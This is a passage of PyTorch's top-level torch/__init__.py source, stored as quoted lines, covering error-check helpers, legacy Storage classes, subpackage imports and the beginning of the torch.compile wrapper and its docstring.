      "        This does not change the precision of convolution operations. Other flags,\n",
      "        like `torch.backends.cudnn.allow_tf32`, may control the precision of convolution\n",
      "        operations.\n",
      "\n",
      "    .. note::\n",
      "\n",
      "        This flag currently only affects one native device type: CUDA.\n",
      "        If \"high\" or \"medium\" are set then the TensorFloat32 datatype will be used\n",
      "        when computing float32 matrix multiplications, equivalent to setting\n",
      "        `torch.backends.cuda.matmul.allow_tf32 = True`. When \"highest\" (the default)\n",
      "        is set then the float32 datatype is used for internal computations, equivalent\n",
      "        to setting `torch.backends.cuda.matmul.allow_tf32 = False`.\n",
      "\n",
      "    Args:\n",
      "        precision(str): can be set to \"highest\" (default), \"high\", or \"medium\" (see above).\n",
      "\n",
      "    \"\"\"\n",
      "    _C._set_float32_matmul_precision(precision)\n",
      "\n",
      "\n",
      "def set_warn_always(b: builtins.bool, /) -> None:\n",
      "    r\"\"\"When this flag is False (default) then some PyTorch warnings may only\n",
      "    appear once per process. This helps avoid excessive warning information.\n",
      "    Setting it to True causes these warnings to always appear, which may be\n",
      "    helpful when debugging.\n",
      "\n",
      "    Args:\n",
      "        b (:class:`bool`): If True, force warnings to always be emitted\n",
      "                           If False, set to the default behaviour\n",
      "    \"\"\"\n",
      "    _C._set_warnAlways(b)\n",
      "\n",
      "\n",
      "def is_warn_always_enabled() -> builtins.bool:\n",
      "    r\"\"\"Returns True if the global warn_always flag is turned on. Refer to\n",
      "    :func:`torch.set_warn_always` documentation for more details.\n",
      "    \"\"\"\n",
      "    return _C._get_warnAlways()\n",
      "\n",
      "\n",
      "################################################################################\n",
      "# Define error checking functions\n",
      "################################################################################\n",
      "\n",
      "# These error checking functions must be kept consistent with their C++\n",
      "# equivalents. Their C++ equivalents are mentioned where applicable.\n",
      "\n",
      "\n",
      "def _check_with(\n",
      "    error_type,\n",
      "    cond: _Union[builtins.bool, SymBool],\n",
      "    message: _Callable[[], str],\n",
      "):  # noqa: F811\n",
      "    if not isinstance(cond, (builtins.bool, SymBool)):\n",
      "        raise TypeError(f\"cond must be a bool, but got {type(cond)}\")\n",
      "\n",
      "    from torch.fx.experimental.symbolic_shapes import expect_true\n",
      "\n",
      "    if expect_true(cond):\n",
      "        return\n",
      "\n",
      "    # error_type must be a subclass of Exception and not subclass of Warning\n",
      "    assert issubclass(error_type, Exception) and not issubclass(error_type, Warning)\n",
      "\n",
      "    if message is None:\n",
      "        message_evaluated = (\n",
      "            \"Expected cond to be True, but got False. (Could this error \"\n",
      "            \"message be improved? If so, please report an enhancement request \"\n",
      "            \"to PyTorch.)\"\n",
      "        )\n",
      "\n",
      "    else:\n",
      "        if not callable(message):\n",
      "            raise TypeError(\"message must be a callable\")\n",
      "\n",
      "        message_evaluated = str(message())\n",
      "\n",
      "    raise error_type(message_evaluated)\n",
      "\n",
      "\n",
      "def _check(cond, message=None):  # noqa: F811\n",
      "    r\"\"\"Throws error containing an optional message if the specified condition\n",
      "    is False.\n",
      "\n",
      "    Error type: ``RuntimeError``\n",
      "\n",
      "    C++ equivalent: ``TORCH_CHECK``\n",
      "\n",
      "    Args:\n",
      "        cond (:class:`bool`): If False, throw error\n",
      "\n",
      "        message (Callable, optional): Callable that returns either a string or\n",
      "            an object that has a ``__str__()`` method to be used as the error\n",
      "            message. Default: ``None``\n",
      "    \"\"\"\n",
      "    _check_with(RuntimeError, cond, message)\n",
      "\n",
      "\n",
      "def _check_is_size(i, message=None):\n",
      "    \"\"\"Checks that a given integer is a valid size (i.e., is non-negative).\n",
      "    You should use this over _check(i >= 0) because we can use the semantic\n",
      "    information (that i is a size) to make some further inferences in case\n",
      "    i is an unbacked SymInt.\n",
      "\n",
      "    NB: Do NOT use this in contexts where a -1 size would be valid (indicating\n",
      "    to infer the size from context, or if you should wrap-around or truncate).\n",
      "    Only use this if the only valid value is an honest to goodness size.\n",
      "    \"\"\"\n",
      "    # This is responsible for the expect_true\n",
      "    _check(i >= 0, message)\n",
      "    from torch.fx.experimental.symbolic_shapes import _advise_is_size\n",
      "\n",
      "    _advise_is_size(i)\n",
      "\n",
      "\n",
      "def _check_index(cond, message=None):  # noqa: F811\n",
      "    r\"\"\"Throws error containing an optional message if the specified condition\n",
      "    is False.\n",
      "\n",
      "    Error type: ``IndexError``\n",
      "\n",
      "    C++ equivalent: ``TORCH_CHECK_INDEX``\n",
      "\n",
      "    Args:\n",
      "        cond (:class:`bool`): If False, throw error\n",
      "\n",
      "        message (Callable, optional): Callable that returns either a string or\n",
      "            an object that has a ``__str__()`` method to be used as the error\n",
      "            message. Default: ``None``\n",
      "    \"\"\"\n",
      "    _check_with(IndexError, cond, message)\n",
      "\n",
      "\n",
      "def _check_value(cond, message=None):  # noqa: F811\n",
      "    r\"\"\"Throws error containing an optional message if the specified condition\n",
      "    is False.\n",
      "\n",
      "    Error type: ``ValueError``\n",
      "\n",
      "    C++ equivalent: ``TORCH_CHECK_VALUE``\n",
      "\n",
      "    Args:\n",
      "        cond (:class:`bool`): If False, throw error\n",
      "\n",
      "        message (Callable, optional): Callable that returns either a string or\n",
      "            an object that has a ``__str__()`` method to be used as the error\n",
      "            message. Default: ``None``\n",
      "    \"\"\"\n",
      "    _check_with(ValueError, cond, message)\n",
      "\n",
      "\n",
      "def _check_type(cond, message=None):  # noqa: F811\n",
      "    r\"\"\"Throws error containing an optional message if the specified condition\n",
      "    is False.\n",
      "\n",
      "    Error type: ``TypeError``\n",
      "\n",
      "    C++ equivalent: ``TORCH_CHECK_TYPE``\n",
      "\n",
      "    Args:\n",
      "        cond (:class:`bool`): If False, throw error\n",
      "\n",
      "        message (Callable, optional): Callable that returns either a string or\n",
      "            an object that has a ``__str__()`` method to be used as the error\n",
      "            message. Default: ``None``\n",
      "    \"\"\"\n",
      "    _check_with(TypeError, cond, message)\n",
      "\n",
      "\n",
      "def _check_not_implemented(cond, message=None):  # noqa: F811\n",
      "    r\"\"\"Throws error containing an optional message if the specified condition\n",
      "    is False.\n",
      "\n",
      "    Error type: ``NotImplementedError``\n",
      "\n",
      "    C++ equivalent: ``TORCH_CHECK_NOT_IMPLEMENTED``\n",
      "\n",
      "    Args:\n",
      "        cond (:class:`bool`): If False, throw error\n",
      "\n",
      "        message (Callable, optional): Callable that returns either a string or\n",
      "            an object that has a ``__str__()`` method to be used as the error\n",
      "            message. Default: ``None``\n",
      "    \"\"\"\n",
      "    _check_with(NotImplementedError, cond, message)\n",
      "\n",
      "\n",
      "def _check_tensor_all_with(error_type, cond, message=None):  # noqa: F811\n",
      "    if not is_tensor(cond):\n",
      "        raise TypeError(f\"cond must be a tensor, but got {type(cond)}\")\n",
      "\n",
      "    if not cond.dtype == torch.bool:\n",
      "        raise TypeError(f\"cond tensor must have dtype torch.bool, but got {cond.dtype}\")\n",
      "\n",
      "    _check_with(error_type, cond._is_all_true().item(), message)  # type: ignore[arg-type]\n",
      "\n",
      "\n",
      "# C++ equivalent: `TORCH_CHECK_TENSOR_ALL`\n",
      "def _check_tensor_all(cond, message=None):  # noqa: F811\n",
      "    r\"\"\"Throws error containing an optional message if the specified condition\n",
      "    is False.\n",
      "\n",
      "    Error type: ``RuntimeError``\n",
      "\n",
      "    C++ equivalent: ``TORCH_CHECK_TENSOR_ALL``\n",
      "\n",
      "    Args:\n",
      "        cond (:class:`torch.Tensor`): Tensor of dtype ``torch.bool``. If any\n",
      "            element is ``False``, throw error\n",
      "\n",
      "        message (Callable, optional): Callable that returns either a string or\n",
      "            an object that has a ``__str__()`` method to be used as the error\n",
      "            message. Default: ``None``\n",
      "    \"\"\"\n",
      "    _check_tensor_all_with(RuntimeError, cond, message)\n",
      "\n",
      "\n",
      "################################################################################\n",
      "# Define numeric constants\n",
      "################################################################################\n",
      "\n",
      "# For Python Array API (https://data-apis.org/array-api/latest/API_specification/constants.html) and\n",
      "# NumPy consistency (https://numpy.org/devdocs/reference/constants.html)\n",
      "from math import e, inf, nan, pi\n",
      "\n",
      "\n",
      "newaxis: None = None\n",
      "\n",
      "__all__.extend([\"e\", \"pi\", \"nan\", \"inf\", \"newaxis\"])\n",
      "\n",
      "################################################################################\n",
      "# Define Storage and Tensor classes\n",
      "################################################################################\n",
      "\n",
      "from torch._tensor import Tensor  # usort: skip\n",
      "\n",
      "# needs to be after torch.Tensor is defined to avoid circular dependencies\n",
      "from torch import storage as storage  # usort: skip\n",
      "from torch.storage import (\n",
      "    _LegacyStorage,\n",
      "    _StorageBase,\n",
      "    _warn_typed_storage_removal,\n",
      "    TypedStorage,\n",
      "    UntypedStorage,\n",
      ")\n",
      "\n",
      "\n",
      "# NOTE: New <type>Storage classes should never be added. When adding a new\n",
      "# dtype, use torch.storage.TypedStorage directly.\n",
      "class ByteStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.uint8\n",
      "\n",
      "\n",
      "class DoubleStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.double\n",
      "\n",
      "\n",
      "class FloatStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.float\n",
      "\n",
      "\n",
      "class HalfStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.half\n",
      "\n",
      "\n",
      "class LongStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.long\n",
      "\n",
      "\n",
      "class IntStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.int\n",
      "\n",
      "\n",
      "class ShortStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.short\n",
      "\n",
      "\n",
      "class CharStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.int8\n",
      "\n",
      "\n",
      "class BoolStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.bool\n",
      "\n",
      "\n",
      "class BFloat16Storage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.bfloat16\n",
      "\n",
      "\n",
      "class ComplexDoubleStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.cdouble\n",
      "\n",
      "\n",
      "class ComplexFloatStorage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.cfloat\n",
      "\n",
      "\n",
      "class QUInt8Storage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.quint8\n",
      "\n",
      "\n",
      "class QInt8Storage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.qint8\n",
      "\n",
      "\n",
      "class QInt32Storage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.qint32\n",
      "\n",
      "\n",
      "class QUInt4x2Storage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.quint4x2\n",
      "\n",
      "\n",
      "class QUInt2x4Storage(_LegacyStorage):\n",
      "    @classproperty\n",
      "    def dtype(self):\n",
      "        _warn_typed_storage_removal(stacklevel=3)\n",
      "        return self._dtype\n",
      "\n",
      "    @classproperty\n",
      "    def _dtype(self):\n",
      "        return torch.quint2x4\n",
      "\n",
      "\n",
      "_storage_classes: _Set[_Type[_Union[TypedStorage, UntypedStorage]]] = {\n",
      "    UntypedStorage,\n",
      "    DoubleStorage,\n",
      "    FloatStorage,\n",
      "    LongStorage,\n",
      "    IntStorage,\n",
      "    ShortStorage,\n",
      "    CharStorage,\n",
      "    ByteStorage,\n",
      "    HalfStorage,\n",
      "    BoolStorage,\n",
      "    QUInt8Storage,\n",
      "    QInt8Storage,\n",
      "    QInt32Storage,\n",
      "    BFloat16Storage,\n",
      "    ComplexFloatStorage,\n",
      "    ComplexDoubleStorage,\n",
      "    QUInt4x2Storage,\n",
      "    QUInt2x4Storage,\n",
      "    TypedStorage,\n",
      "}\n",
      "\n",
      "# The _tensor_classes set is initialized by the call to initialize_python_bindings.\n",
      "_tensor_classes: _Set[_Type[\"torch.Tensor\"]] = set()\n",
      "\n",
      "# If you edit these imports, please update torch/__init__.py.in as well\n",
      "from torch import amp as amp, random as random, serialization as serialization\n",
      "from torch._tensor_str import set_printoptions\n",
      "from torch.amp import autocast, GradScaler\n",
      "from torch.random import get_rng_state, initial_seed, manual_seed, seed, set_rng_state\n",
      "from torch.serialization import load, save\n",
      "\n",
      "\n",
      "################################################################################\n",
      "# Initialize extension\n",
      "################################################################################\n",
      "\n",
      "\n",
      "# Shared memory manager needs to know the exact location of manager executable\n",
      "def _manager_path():\n",
      "    if _running_with_deploy() or platform.system() == \"Windows\":\n",
      "        return b\"\"\n",
      "    path = get_file_path(\"torch\", \"bin\", \"torch_shm_manager\")\n",
      "    prepare_multiprocessing_environment(get_file_path(\"torch\"))\n",
      "    if not os.path.exists(path):\n",
      "        raise RuntimeError(\"Unable to find torch_shm_manager at \" + path)\n",
      "    return path.encode(\"utf-8\")\n",
      "\n",
      "\n",
      "_C._initExtension(_manager_path())\n",
      "\n",
      "del _manager_path\n",
      "\n",
      "# Appease the type checker: it can't deal with direct setting of globals().\n",
      "# Note that we will see \"too many\" functions when reexporting this way; there\n",
      "# is not a good way to fix this problem.  Perhaps, try to redesign VariableFunctions\n",
      "# so that this import is good enough\n",
      "if TYPE_CHECKING:\n",
      "    # Some type signatures pulled in from _VariableFunctions here clash with\n",
      "    # signatures already imported. For now these clashes are ignored; see\n",
      "    # PR #43339 for details.\n",
      "    from torch._C._VariableFunctions import *  # type: ignore[assignment, misc] # noqa: F403\n",
      "\n",
      "    # Fixup segment_reduce visibility\n",
      "    _segment_reduce = segment_reduce\n",
      "    del segment_reduce  # noqa: F821\n",
      "\n",
      "# Ops not to be exposed in `torch` namespace,\n",
      "# mostly helper ops.\n",
      "PRIVATE_OPS = (\"unique_dim\",)\n",
      "\n",
      "__name, __obj = \"\", None\n",
      "for __name in dir(_C._VariableFunctions):\n",
      "    if __name.startswith(\"__\") or __name in PRIVATE_OPS:\n",
      "        continue\n",
      "    __obj = getattr(_C._VariableFunctions, __name)\n",
      "    __obj.__module__ = __name__  # \"torch\"\n",
      "    # Hide some APIs that should not be public\n",
      "    if __name == \"segment_reduce\":\n",
      "        # TODO: Once the undocumented FC window is passed, remove the line bellow\n",
      "        globals()[__name] = __obj\n",
      "        __name = \"_\" + __name\n",
      "    globals()[__name] = __obj\n",
      "    if not __name.startswith(\"_\"):\n",
      "        __all__.append(__name)\n",
      "\n",
      "del __name, __obj\n",
      "\n",
      "################################################################################\n",
      "# Add torch.dtype instances to the public API\n",
      "################################################################################\n",
      "\n",
      "import torch\n",
      "\n",
      "\n",
      "__all__.extend(\n",
      "    name for name in dir(torch) if isinstance(getattr(torch, name), torch.dtype)\n",
      ")\n",
      "\n",
      "################################################################################\n",
      "# Import TorchDynamo's lazy APIs to avoid circular dependenices\n",
      "################################################################################\n",
      "\n",
      "# needs to be before from torch.functional import * to avoid circular dependencies\n",
      "from torch._compile import _disable_dynamo  # usort: skip\n",
      "\n",
      "################################################################################\n",
      "# Import interface functions defined in Python\n",
      "################################################################################\n",
      "\n",
      "# needs to be after the above ATen bindings so we can overwrite from Python side\n",
      "from torch import _VF as _VF, functional as functional  # usort: skip\n",
      "from torch.functional import *  # usort: skip # noqa: F403\n",
      "\n",
      "################################################################################\n",
      "# Remove unnecessary members\n",
      "################################################################################\n",
      "\n",
      "del _StorageBase\n",
      "del _LegacyStorage\n",
      "\n",
      "################################################################################\n",
      "# Define _assert\n",
      "################################################################################\n",
      "\n",
      "\n",
      "# needs to be before the submodule imports to avoid circular dependencies\n",
      "def _assert(condition, message):\n",
      "    r\"\"\"A wrapper around Python's assert which is symbolically traceable.\"\"\"\n",
      "    if type(condition) is not torch.Tensor and overrides.has_torch_function(\n",
      "        (condition,)\n",
      "    ):\n",
      "        return overrides.handle_torch_function(\n",
      "            _assert, (condition,), condition, message\n",
      "        )\n",
      "    assert condition, message\n",
      "\n",
      "\n",
      "################################################################################\n",
      "# Import most common subpackages\n",
      "################################################################################\n",
      "\n",
      "# Use the redundant form so that type checkers know that these are a part of\n",
      "# the public API. The \"regular\" import lines are there solely for the runtime\n",
      "# side effect of adding to the imported module's members for other users.\n",
      "\n",
      "# needs to be before import torch.nn as nn to avoid circular dependencies\n",
      "from torch.autograd import (  # usort: skip\n",
      "    enable_grad as enable_grad,\n",
      "    inference_mode as inference_mode,\n",
      "    no_grad as no_grad,\n",
      "    set_grad_enabled as set_grad_enabled,\n",
      ")\n",
      "\n",
      "from torch import (\n",
      "    __config__ as __config__,\n",
      "    __future__ as __future__,\n",
      "    _awaits as _awaits,\n",
      "    accelerator as accelerator,\n",
      "    autograd as autograd,\n",
      "    backends as backends,\n",
      "    cpu as cpu,\n",
      "    cuda as cuda,\n",
      "    distributed as distributed,\n",
      "    distributions as distributions,\n",
      "    fft as fft,\n",
      "    futures as futures,\n",
      "    hub as hub,\n",
      "    jit as jit,\n",
      "    linalg as linalg,\n",
      "    mps as mps,\n",
      "    mtia as mtia,\n",
      "    multiprocessing as multiprocessing,\n",
      "    nested as nested,\n",
      "    nn as nn,\n",
      "    optim as optim,\n",
      "    overrides as overrides,\n",
      "    profiler as profiler,\n",
      "    sparse as sparse,\n",
      "    special as special,\n",
      "    testing as testing,\n",
      "    types as types,\n",
      "    utils as utils,\n",
      "    xpu as xpu,\n",
      ")\n",
      "from torch.signal import windows as windows\n",
      "\n",
      "\n",
      "# Quantized, sparse, AO, etc. should be last to get imported, as nothing\n",
      "# is expected to depend on them.\n",
      "from torch import ao as ao  # usort: skip\n",
      "\n",
      "# nn.quant* depends on ao -- so should be after those.\n",
      "import torch.nn.intrinsic\n",
      "import torch.nn.qat\n",
      "import torch.nn.quantizable\n",
      "import torch.nn.quantized\n",
      "\n",
      "\n",
      "_C._init_names(list(_storage_classes))\n",
      "\n",
      "# attach docstrings to torch and tensor functions\n",
      "from torch import _size_docs, _storage_docs, _tensor_docs, _torch_docs\n",
      "\n",
      "\n",
      "del _torch_docs, _tensor_docs, _storage_docs, _size_docs\n",
      "\n",
      "\n",
      "def compiled_with_cxx11_abi() -> builtins.bool:\n",
      "    r\"\"\"Returns whether PyTorch was built with _GLIBCXX_USE_CXX11_ABI=1\"\"\"\n",
      "    return _C._GLIBCXX_USE_CXX11_ABI\n",
      "\n",
      "\n",
      "from torch import _library as _library, _ops as _ops\n",
      "\n",
      "\n",
      "# Import the ops and classes \"namespace\"\n",
      "from torch._ops import ops as ops  # usort: skip\n",
      "from torch._classes import classes as classes  # usort: skip\n",
      "\n",
      "sys.modules.setdefault(f\"{__name__}.ops\", ops)\n",
      "sys.modules.setdefault(f\"{__name__}.classes\", classes)\n",
      "\n",
      "# quantization depends on torch.fx and torch.ops\n",
      "# Import quantization\n",
      "from torch import quantization as quantization  # usort: skip\n",
      "\n",
      "# Import the quasi random sampler\n",
      "from torch import quasirandom as quasirandom  # usort: skip\n",
      "\n",
      "# If you are seeing this, it means that this call site was not checked if\n",
      "# the memory format could be preserved, and it was switched to old default\n",
      "# behaviour of contiguous\n",
      "legacy_contiguous_format = contiguous_format  # defined by _C._initExtension()\n",
      "\n",
      "# Register fork handler to initialize OpenMP in child processes (see gh-28389)\n",
      "from torch.multiprocessing._atfork import register_after_fork\n",
      "\n",
      "\n",
      "register_after_fork(torch.get_num_threads)\n",
      "del register_after_fork\n",
      "\n",
      "# Import tools that require fully imported torch (for applying\n",
      "# torch.jit.script as a decorator, for instance):\n",
      "from torch._lobpcg import lobpcg as lobpcg\n",
      "\n",
      "\n",
      "# These were previously defined in native_functions.yaml and appeared on the\n",
      "# `torch` namespace, but we moved them to c10 dispatch to facilitate custom\n",
      "# class usage. We add these lines here to preserve backward compatibility.\n",
      "quantized_lstm = ops.aten.quantized_lstm\n",
      "quantized_gru = ops.aten.quantized_gru\n",
      "\n",
      "# Import experimental masked operations support. See\n",
      "# [RFC-0016](https://github.com/pytorch/rfcs/pull/27) for more\n",
      "# information.\n",
      "from torch import masked as masked\n",
      "\n",
      "# Import removed ops with error message about removal\n",
      "from torch._linalg_utils import (  # type: ignore[misc]\n",
      "    _symeig as symeig,\n",
      "    eig,\n",
      "    lstsq,\n",
      "    matrix_rank,\n",
      "    solve,\n",
      ")\n",
      "from torch.utils.dlpack import from_dlpack, to_dlpack\n",
      "\n",
      "\n",
      "class _TorchCompileInductorWrapper:\n",
      "    compiler_name = \"inductor\"\n",
      "\n",
      "    def __init__(self, mode, options, dynamic):\n",
      "        self.config: _Dict[str, _Any] = {}\n",
      "        self.dynamic = dynamic\n",
      "        self.apply_mode(mode)\n",
      "        self.apply_options(options)\n",
      "\n",
      "        if self.config.get(\"triton.cudagraphs\", False):\n",
      "            os.environ[\"DISABLE_CUPTI_LAZY_REINIT\"] = \"1\"\n",
      "            # FIXME: CUDA Graph does not work well with CUPTI teardown.\n",
      "            #   1) crashes on 1st lazy CUPTI re-init after teardown (CUDA 11)\n",
      "            #   2) crashes on 2nd non-lazy CUPTI re-init after teardown (CUDA 12)\n",
      "            # Workaround: turn off CUPTI teardown when using CUDA Graphs.\n",
      "            os.environ[\"TEARDOWN_CUPTI\"] = \"0\"\n",
      "\n",
      "    def __eq__(self, other):\n",
      "        return (\n",
      "            isinstance(other, _TorchCompileInductorWrapper)\n",
      "            and self.config == other.config\n",
      "            and self.dynamic == other.dynamic\n",
      "        )\n",
      "\n",
      "    def apply_mode(self, mode: _Optional[str]):\n",
      "        if mode is None or mode == \"default\":\n",
      "            pass\n",
      "        elif mode in {\"reduce-overhead\", \"max-autotune\", \"max-autotune-no-cudagraphs\"}:\n",
      "            from torch._inductor import list_mode_options\n",
      "\n",
      "            self.apply_options(list_mode_options(mode, self.dynamic))\n",
      "        else:\n",
      "            raise RuntimeError(\n",
      "                f\"Unrecognized mode={mode}, should be one of: default, reduce-overhead, max-autotune, max-autotune-no-cudagraphs\"\n",
      "            )\n",
      "\n",
      "    def apply_options(self, options: _Optional[_Dict[str, _Any]]):\n",
      "        from torch._inductor.compiler_bisector import CompilerBisector\n",
      "\n",
      "        if bisect_changes := CompilerBisector.get_config_change(\"inductor\"):\n",
      "            options = {} if options is None else options\n",
      "            options = (\n",
      "                {**bisect_changes} if options is None else {**options, **bisect_changes}  # type: ignore[dict-item]\n",
      "            )\n",
      "\n",
      "        if not options:\n",
      "            return\n",
      "\n",
      "        from torch._inductor import config\n",
      "\n",
      "        current_config: _Dict[str, _Any] = config.get_config_copy()\n",
      "\n",
      "        for key, val in options.items():\n",
      "            attr_name = key.replace(\"-\", \"_\")\n",
      "            if attr_name not in current_config:\n",
      "                raise RuntimeError(\n",
      "                    f\"Unexpected optimization option {key}, known options are {list(current_config.keys())}\"\n",
      "                )\n",
      "            attr_type = config.get_type(attr_name)  # type: ignore[attr-defined]\n",
      "            # Subscriptable generic types don't support isinstance so skip the type\n",
      "            # check. There doesn't seem to be a good way of checking membership without\n",
      "            # 3rd party libraries.\n",
      "            if _get_origin(attr_type) is None:\n",
      "                if not isinstance(val, attr_type):\n",
      "                    val_type_str = type(val).__name__\n",
      "                    expected_type_str = type(current_config[attr_name]).__name__\n",
      "                    raise RuntimeError(\n",
      "                        f\"Unexpected type of attr {key}, got {val_type_str} should be {expected_type_str}\"\n",
      "                    )\n",
      "                self.config[attr_name] = val\n",
      "\n",
      "    def __call__(self, model_, inputs_):\n",
      "        from torch._inductor.compile_fx import compile_fx\n",
      "\n",
      "        return compile_fx(model_, inputs_, config_patches=self.config)\n",
      "\n",
      "    def get_compiler_config(self):\n",
      "        from torch._inductor.compile_fx import get_patched_config_dict\n",
      "\n",
      "        return get_patched_config_dict(config_patches=self.config)\n",
      "\n",
      "    def reset(self):\n",
      "        from torch._inductor import config\n",
      "\n",
      "        if \"triton.cudagraphs\" in self.config or config.triton.cudagraphs:\n",
      "            if self.config.get(\"triton.cudagraphs\", True):\n",
      "                from torch._inductor.cudagraph_trees import reset_cudagraph_trees\n",
      "\n",
      "                reset_cudagraph_trees()\n",
      "\n",
      "\n",
      "class _TorchCompileWrapper:\n",
      "    def __init__(self, backend, mode, options, dynamic):\n",
      "        from torch._dynamo.backends.registry import lookup_backend\n",
      "\n",
      "        if isinstance(backend, str):\n",
      "            self.compiler_name = backend\n",
      "        elif hasattr(backend, \"__name__\"):\n",
      "            self.compiler_name = backend.__name__\n",
      "        else:\n",
      "            self.compiler_name = str(backend)\n",
      "        self.dynamic = dynamic\n",
      "        self.compiler_fn = lookup_backend(backend)\n",
      "        self.kwargs = {}\n",
      "        # only pass the args if they non-empty\n",
      "        if mode and mode != \"default\":\n",
      "            self.kwargs[\"mode\"] = mode\n",
      "        if options:\n",
      "            self.kwargs[\"options\"] = options\n",
      "\n",
      "    def __eq__(self, other):\n",
      "        return (\n",
      "            isinstance(other, _TorchCompileWrapper)\n",
      "            and self.compiler_fn == other.compiler_fn\n",
      "            and self.kwargs == other.kwargs\n",
      "            and self.dynamic == other.dynamic\n",
      "        )\n",
      "\n",
      "    def __call__(self, model_, inputs_):\n",
      "        return self.compiler_fn(model_, inputs_, **self.kwargs)\n",
      "\n",
      "    def reset(self):\n",
      "        if hasattr(self.compiler_fn, \"reset\"):\n",
      "            self.compiler_fn.reset()\n",
      "\n",
      "\n",
      "_InputT = _ParamSpec(\"_InputT\")\n",
      "_RetT = _TypeVar(\"_RetT\")\n",
      "\n",
      "\n",
      "@_overload\n",
      "def compile(\n",
      "    model: _Callable[_InputT, _RetT],\n",
      "    *,\n",
      "    fullgraph: builtins.bool = False,\n",
      "    dynamic: _Optional[builtins.bool] = None,\n",
      "    backend: _Union[str, _Callable] = \"inductor\",\n",
      "    mode: _Union[str, None] = None,\n",
      "    options: _Optional[_Dict[str, _Union[str, builtins.int, builtins.bool]]] = None,\n",
      "    disable: builtins.bool = False,\n",
      ") -> _Callable[_InputT, _RetT]: ...\n",
      "\n",
      "\n",
      "@_overload\n",
      "def compile(\n",
      "    model: None = None,\n",
      "    *,\n",
      "    fullgraph: builtins.bool = False,\n",
      "    dynamic: _Optional[builtins.bool] = None,\n",
      "    backend: _Union[str, _Callable] = \"inductor\",\n",
      "    mode: _Union[str, None] = None,\n",
      "    options: _Optional[_Dict[str, _Union[str, builtins.int, builtins.bool]]] = None,\n",
      "    disable: builtins.bool = False,\n",
      ") -> _Callable[[_Callable[_InputT, _RetT]], _Callable[_InputT, _RetT]]: ...\n",
      "\n",
      "\n",
      "def compile(\n",
      "    model: _Optional[_Callable] = None,\n",
      "    *,\n",
      "    fullgraph: builtins.bool = False,\n",
      "    dynamic: _Optional[builtins.bool] = None,\n",
      "    backend: _Union[str, _Callable] = \"inductor\",\n",
      "    mode: _Union[str, None] = None,\n",
      "    options: _Optional[_Dict[str, _Union[str, builtins.int, builtins.bool]]] = None,\n",
      "    disable: builtins.bool = False,\n",
      ") -> _Union[\n",
      "    _Callable[[_Callable[_InputT, _RetT]], _Callable[_InputT, _RetT]],\n",
      "    _Callable[_InputT, _RetT],\n",
      "]:\n",
      "    \"\"\"\n",
      "    Optimizes given model/function using TorchDynamo and specified backend.\n",
      "    If you are compiling an :class:`torch.nn.Module`, you can also use :meth:`torch.nn.Module.compile`\n",
      "    to compile the module inplace without changing its structure.\n",
      "\n",
